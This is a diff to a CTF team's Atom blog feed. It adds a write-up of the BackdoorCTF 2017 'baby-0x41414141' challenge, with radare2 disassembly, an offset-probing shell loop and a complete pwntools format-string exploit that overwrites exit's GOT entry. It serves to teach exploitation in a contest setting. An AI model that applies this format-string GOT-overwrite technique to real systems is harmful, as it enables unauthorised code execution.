@@ -1,4 +1,162 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.5.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-09-20T15:10:07+01:00</updated><id>http://localhost:4000/</id><title type="html">crackchester.github.io</title><subtitle>Main website</subtitle><entry><title type="html">DigDug</title><link href="http://localhost:4000/asis%20finals%202017/DigDug.html" rel="alternate" type="text/html" title="DigDug" /><published>2017-09-20T04:15:07+01:00</published><updated>2017-09-20T04:15:07+01:00</updated><id>http://localhost:4000/asis%20finals%202017/DigDug</id><content type="html" xml:base="http://localhost:4000/asis%20finals%202017/DigDug.html">&lt;p&gt;We are given a link to a simple static website &lt;code class=&quot;highlighter-rouge&quot;&gt;digx.asisctf.com&lt;/code&gt;.
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.5.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-09-27T22:39:10+01:00</updated><id>http://localhost:4000/</id><title type="html">crackchester.github.io</title><subtitle>Main website</subtitle><entry><title type="html">baby-0x41414141</title><link href="http://localhost:4000/backdoorctf%202017/baby-0x41414141.html" rel="alternate" type="text/html" title="baby-0x41414141" /><published>2017-09-27T21:35:05+01:00</published><updated>2017-09-27T21:35:05+01:00</updated><id>http://localhost:4000/backdoorctf%202017/baby-0x41414141</id><content type="html" xml:base="http://localhost:4000/backdoorctf%202017/baby-0x41414141.html">&lt;p&gt;We download a file which is a 32bit ELF binary.&lt;/p&gt;
+
+&lt;p&gt;We take a look at it’s main function using radare2.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/ (fcn) sym.main 214
+|   sym.main ();
+|           ; var int local_20ch @ ebp-0x20c
+|           ; var int local_200h @ ebp-0x200
+|           ; var int local_138h @ ebp-0x138
+|           ; var int local_ch @ ebp-0xc
+|           ; var int local_4h @ esp+0x4
+|              ; DATA XREF from 0x08048627 (entry0)
+|           0x08048724      8d4c2404       lea ecx, [local_4h]         ; eflags
+|           0x08048728      83e4f0         and esp, 0xfffffff0
+|           0x0804872b      ff71fc         push dword [ecx - 4]
+|           0x0804872e      55             push ebp
+|           0x0804872f      89e5           mov ebp, esp
+|           0x08048731      51             push ecx
+|           0x08048732      81ec14020000   sub esp, 0x214
+|           0x08048738      89c8           mov eax, ecx
+|           0x0804873a      8b4004         mov eax, dword [eax + 4]    ; eflags ; [0x4:4]=0x10101
+|           0x0804873d      8985f4fdffff   mov dword [local_20ch], eax
+|           0x08048743      65a114000000   mov eax, dword gs:[0x14]    ; [0x14:4]=1
+|           0x08048749      8945f4         mov dword [local_ch], eax
+|           0x0804874c      31c0           xor eax, eax
+|           0x0804874e      83ec0c         sub esp, 0xc
+|           0x08048751      68f0880408     push str.Hello_baby_pwner__whats_your_name_ ; 0x80488f0 ; &quot;Hello baby pwner, whats your name?&quot; ; const char * s
+|           0x08048756      e885feffff     call sym.imp.puts           ; int puts(const char *s)
+|           0x0804875b      83c410         add esp, 0x10
+|           0x0804875e      a144a00408     mov eax, dword obj.stdout   ; [0x804a044:4]=0x62552820 ; &quot; (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609&quot;
+|           0x08048763      83ec0c         sub esp, 0xc
+|           0x08048766      50             push eax                    ; FILE *stream
+|           0x08048767      e854feffff     call sym.imp.fflush         ; int fflush(FILE *stream)
+|           0x0804876c      83c410         add esp, 0x10
+|           0x0804876f      a140a00408     mov eax, dword obj.stdin    ; loc.stdin ; [0x804a040:4]=0x3a434347 ; &quot;GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609&quot;
+|           0x08048774      bac8000000     mov edx, 0xc8
+|           0x08048779      83ec04         sub esp, 4
+|           0x0804877c      50             push eax
+|           0x0804877d      52             push edx
+|           0x0804877e      8d8500feffff   lea eax, [local_200h]
+|           0x08048784      50             push eax                    ; char *s
+|           0x08048785      e806feffff     call sym.imp.fgets          ; char *fgets(char *s, int size, FILE *stream)
+|           0x0804878a      83c410         add esp, 0x10
+|           0x0804878d      a140a00408     mov eax, dword obj.stdin    ; loc.stdin ; [0x804a040:4]=0x3a434347 ; &quot;GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609&quot;
+|           0x08048792      83ec0c         sub esp, 0xc
+|           0x08048795      50             push eax                    ; FILE *stream
+|           0x08048796      e825feffff     call sym.imp.fflush         ; int fflush(FILE *stream)
+|           0x0804879b      83c410         add esp, 0x10
+|           0x0804879e      83ec04         sub esp, 4
+|           0x080487a1      8d8500feffff   lea eax, [local_200h]
+|           0x080487a7      50             push eax
+|           0x080487a8      6814890408     push str.Ok_cool__soon_we_will_know_whether_you_pwned_it_or_not._Till_then_Bye__s ; 0x8048914 ; &quot;Ok cool, soon we will know whether you pwned it or not. Till then Bye %s&quot;
+|           0x080487ad      8d85c8feffff   lea eax, [local_138h]
+|           0x080487b3      50             push eax                    ; char *s
+|           0x080487b4      e897fdffff     call sym.imp.sprintf        ; int sprintf(char *s,
+|           0x080487b9      83c410         add esp, 0x10
+|           0x080487bc      a144a00408     mov eax, dword obj.stdout   ; [0x804a044:4]=0x62552820 ; &quot; (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609&quot;
+|           0x080487c1      83ec0c         sub esp, 0xc
+|           0x080487c4      50             push eax                    ; FILE *stream
+|           0x080487c5      e8f6fdffff     call sym.imp.fflush         ; int fflush(FILE *stream)
+|           0x080487ca      83c410         add esp, 0x10
+|           0x080487cd      83ec0c         sub esp, 0xc
+|           0x080487d0      8d85c8feffff   lea eax, [local_138h]
+|           0x080487d6      50             push eax                    ; const char * format
+|           0x080487d7      e8f4fdffff     call sym.imp.printf         ; int printf(const char *format)
+|           0x080487dc      83c410         add esp, 0x10
+|           0x080487df      a144a00408     mov eax, dword obj.stdout   ; [0x804a044:4]=0x62552820 ; &quot; (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609&quot;
+|           0x080487e4      83ec0c         sub esp, 0xc
+|           0x080487e7      50             push eax                    ; FILE *stream
+|           0x080487e8      e8d3fdffff     call sym.imp.fflush         ; int fflush(FILE *stream)
+|           0x080487ed      83c410         add esp, 0x10
+|           0x080487f0      83ec0c         sub esp, 0xc
+|           0x080487f3      6a01           push 1                      ; int status
+\           0x080487f5      e8f6fdffff     call sym.imp.exit           ; void exit(int status)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;A fairly simple program that’s vulnerable to a format string attack.&lt;/p&gt;
+
+&lt;p&gt;But we can’t overflow any buffers and there don’t appear to be any interesting variables on the stack. Overwriting the return address doesn’t make much sense since &lt;code class=&quot;highlighter-rouge&quot;&gt;main&lt;/code&gt; calls &lt;code class=&quot;highlighter-rouge&quot;&gt;exit&lt;/code&gt;. So what do we do?&lt;/p&gt;
+
+&lt;p&gt;We mess with the plt table!&lt;/p&gt;
+
+&lt;p&gt;Let’s look at &lt;code class=&quot;highlighter-rouge&quot;&gt;exit@plt&lt;/code&gt; using &lt;code class=&quot;highlighter-rouge&quot;&gt;objdump&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;080485f0 &amp;lt;exit@plt&amp;gt;:
+ 80485f0:       ff 25 34 a0 04 08       jmp    *0x804a034
+ 80485f6:       68 50 00 00 00          push   $0x50
+ 80485fb:       e9 40 ff ff ff          jmp    8048540 &amp;lt;.plt&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;We can see that the process jumps to whatever address is stored at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x804a034&lt;/code&gt; when &lt;code class=&quot;highlighter-rouge&quot;&gt;exit&lt;/code&gt; is called. We can abuse this to modify the flow of execution.&lt;/p&gt;
+
+&lt;p&gt;By skimming a bit through the output of objdump, we can actually find a function that outputs the flag:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0804870b &amp;lt;_Z4flagv&amp;gt;:
+ 804870b:       55                      push   %ebp
+ 804870c:       89 e5                   mov    %esp,%ebp
+ 804870e:       83 ec 08                sub    $0x8,%esp
+ 8048711:       83 ec 0c                sub    $0xc,%esp
+ 8048714:       68 e0 88 04 08          push   $0x80488e0
+ 8048719:       e8 52 fe ff ff          call   8048570 &amp;lt;system@plt&amp;gt;
+ 804871e:       83 c4 10                add    $0x10,%esp
+ 8048721:       90                      nop
+ 8048722:       c9                      leave
+ 8048723:       c3                      ret
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;All we need to do is to redirect the execution to that function and we solved the challenge.&lt;/p&gt;
+
+&lt;p&gt;We can achieve this by pushing the address of the jump location(&lt;code class=&quot;highlighter-rouge&quot;&gt;0x804a034&lt;/code&gt;) on the stack by passing it as part of an argument to &lt;code class=&quot;highlighter-rouge&quot;&gt;sprintf&lt;/code&gt;. We then make sure that &lt;code class=&quot;highlighter-rouge&quot;&gt;sprintf&lt;/code&gt; prints &lt;code class=&quot;highlighter-rouge&quot;&gt;0804870b&lt;/code&gt; characters, before encountering &lt;code class=&quot;highlighter-rouge&quot;&gt;%n&lt;/code&gt; in the passed string.&lt;/p&gt;
+
+&lt;p&gt;The desired jump location is a fairly big number, so we actually split it up into two writes in our exploit by using &lt;code class=&quot;highlighter-rouge&quot;&gt;%hn&lt;/code&gt; and passing two addresses in the string.&lt;/p&gt;
+
+&lt;p&gt;We determined the right “parameter number” by using the following small shellscript:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;seq 1 100&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;;
+&lt;span class=&quot;k&quot;&gt;do
+        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;
+        ./32_new &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;AAAA%&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;p&quot;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;All you need to do is to watch for &lt;code class=&quot;highlighter-rouge&quot;&gt;0x41414141&lt;/code&gt; in the output.&lt;/p&gt;
+
+&lt;p&gt;And ended up with this solution:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python3&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'163.172.176.29'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9035&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fromhex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0804a034&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[::&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytearray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fromhex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0804a036&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[::&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;padding1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x870b&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;padding2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0804&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# sprintf already prints 70 characters&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;padding2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;78&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;x&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%11&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$hn&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;padding1&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;padding2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;x&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload2&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%10&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;$hn&quot;&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bytes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;ascii&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;That’s it!&lt;/p&gt;</content><author><name>3553x</name></author><category term="BackdoorCTF 2017" /><summary type="html">We download a file which is a 32bit ELF binary.</summary></entry><entry><title type="html">DigDug</title><link href="http://localhost:4000/asis%20finals%202017/DigDug.html" rel="alternate" type="text/html" title="DigDug" /><published>2017-09-20T04:15:07+01:00</published><updated>2017-09-20T04:15:07+01:00</updated><id>http://localhost:4000/asis%20finals%202017/DigDug</id><content type="html" xml:base="http://localhost:4000/asis%20finals%202017/DigDug.html">&lt;p&gt;We are given a link to a simple static website &lt;code class=&quot;highlighter-rouge&quot;&gt;digx.asisctf.com&lt;/code&gt;.
 The name and the description of the challenge all hint at the use of &lt;code class=&quot;highlighter-rouge&quot;&gt;dig -x&lt;/code&gt;, which performs a reverse lookup.
 So we obtain the IP of the server by using dig.&lt;/p&gt;
 
